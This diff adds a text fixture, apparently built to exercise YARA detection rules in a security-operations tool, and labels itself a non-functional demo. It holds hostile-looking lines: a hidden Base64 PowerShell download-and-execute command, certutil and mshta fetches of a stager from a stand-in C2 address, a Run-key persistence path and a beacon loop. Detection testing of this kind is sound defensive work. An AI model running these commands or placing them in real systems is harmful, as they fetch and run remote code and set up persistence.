@@ -1,0 +1,38 @@
+# =============================================================================
+# FICTIONAL DEMO ARTIFACT — NOT FUNCTIONAL — FOR YARA RULE TESTING ONLY
+# =============================================================================
+# This is a plain-text file (.txt) that cannot be executed.
+# It contains string patterns that match the educational YARA rules included
+# with SOC Copilot Workbench, for demonstration of static YARA triage.
+#
+# No real malware. No real infrastructure. No harmful code.
+# All IPs are RFC 1918 / RFC 5737 documentation-only ranges.
+# =============================================================================
+
+# Stage-1 loader — simulated pattern (non-functional)
+$c2_host = "192.168.1.200"    # RFC 1918 documentation range — fictional C2
+$beacon_interval_sec = 30
+
+# Obfuscated download-and-execute simulation
+# Matches YARA rule: PowerShell_Encoded_Command
+powershell -noprofile -windowstyle hidden -ExecutionPolicy Bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAkAGMAMgBfAGgAbwBzAHQAKQA=
+
+# LOLBAS file download — non-functional string reference
+# Matches YARA rule: Suspicious_LOLBAS_Usage
+certutil.exe -urlcache -split -f http://192.168.1.200/stager.exe C:\ProgramData\update\stager.exe
+
+# HTML Application loader — non-functional string reference
+# Matches YARA rule: Suspicious_LOLBAS_Usage
+mshta.exe http://192.168.1.200/loader.hta
+
+# Registry persistence key reference — non-functional string
+# Matches YARA rule: Persistence_Registry_Run_Keys
+# Target: HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
+# Value:  "Updater" -> "C:\ProgramData\update\stager.exe"
+$reg_path = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+
+# Beacon loop — non-functional pseudocode
+# while ($true) {
+#     $response = Invoke-WebRequest -Uri "http://$c2_host/beacon" -Method POST
+#     Start-Sleep -Seconds $beacon_interval_sec
+# }
